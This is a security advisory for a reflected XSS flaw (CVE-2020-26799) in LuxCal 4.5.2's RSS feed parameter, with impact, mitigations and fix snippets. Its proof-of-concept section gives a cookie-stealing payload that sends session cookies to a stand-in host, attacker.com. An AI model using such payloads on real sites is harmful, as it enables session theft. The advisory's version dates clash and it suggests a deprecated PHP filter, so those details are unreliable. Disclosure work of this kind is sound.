## Overview

A reflected cross-site scripting (XSS) vulnerability was discovered in LuxCal 4.5.2 which allows an unauthenticated attacker to steal other users' data and perform malicious actions in the context of the victim's browser session.

## Technical Details

**CVE ID:** CVE-2020-26799  
**CVSS Score:** 6.1 (Medium)  
**Affected Versions:** LuxCal v4.5.2  
**Latest Version:** LuxCal v4.7.x (released 2018)  
**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)  

### Affected Component
- File: `index.php`
- Parameter: RSS feed link parameter
- Attack Vector: Network (Unauthenticated)

### Vulnerability Description

The reflected XSS vulnerability exists in the `index.php` file where malicious JavaScript code can be injected as part of the RSS feed link parameter. The application fails to properly sanitize user input before reflecting it back in the HTML response, allowing attackers to execute arbitrary JavaScript in victims' browsers.

## Impact

This vulnerability allows attackers to:

1. **Information Disclosure** - Access sensitive user data and session information
2. **Cookie Stealing** - Hijack user sessions by stealing authentication cookies
3. **Social Engineering Attacks** - Display fake login forms or malicious content
4. **Cross-Site Request Forgery** - Perform actions on behalf of the victim
5. **Credential Harvesting** - Capture user credentials through fake forms
6. **Malware Distribution** - Redirect users to malicious websites

### Attack Scenarios

**Scenario 1: Session Hijacking**
An attacker can craft a malicious URL that steals the victim's session cookies and sends them to an attacker-controlled server.

**Scenario 2: Credential Theft**
The attacker can inject JavaScript that displays a fake login form, capturing credentials when users attempt to log in.

**Scenario 3: Defacement**
Malicious scripts can modify the page content to display unauthorized information or redirect users to malicious sites.

## Proof of Concept

A demonstration of this vulnerability exploitation is available in the following video:

**Video PoC:** [https://youtu.be/npw9jcQ1h1U](https://youtu.be/npw9jcQ1h1U)

### Basic XSS Payload Example
```html
<!-- Malicious URL structure -->
http://target.com/index.php?rssfeed=<script>alert('XSS')</script>

<!-- Advanced payload for cookie stealing -->
http://target.com/index.php?rssfeed=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

## Attack Vectors

- **Network-based**: Remote exploitation via crafted URLs
- **Unauthenticated**: No authentication required to exploit
- **Social Engineering**: Victims can be tricked into clicking malicious links
- **Email/Messaging**: Malicious URLs can be distributed via email or messaging platforms

## Affected Organizations

During penetration testing engagements, this vulnerable version of LuxCal was found to still be in use by various organizations, including enterprise environments, as late as October 2020. This highlights the importance of keeping software updated to the latest versions.

## Mitigation

### Immediate Actions
1. **Update to Latest Version**: Upgrade to LuxCal v4.7.x or later immediately
2. **Input Validation**: Implement proper input sanitization for all user-supplied parameters
3. **Output Encoding**: Ensure all dynamic content is properly encoded before output
4. **Content Security Policy**: Implement CSP headers to prevent XSS execution

### Recommended Fixes
```php
// Example fix for input sanitization
$rssfeed = htmlspecialchars($_GET['rssfeed'], ENT_QUOTES, 'UTF-8');

// Or use a more comprehensive sanitization library
$rssfeed = filter_var($_GET['rssfeed'], FILTER_SANITIZE_STRING);
```

### Security Headers
```apache
# Add these headers to prevent XSS
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set X-XSS-Protection "1; mode=block"
Header always set Content-Security-Policy "default-src 'self'"
```

## Timeline
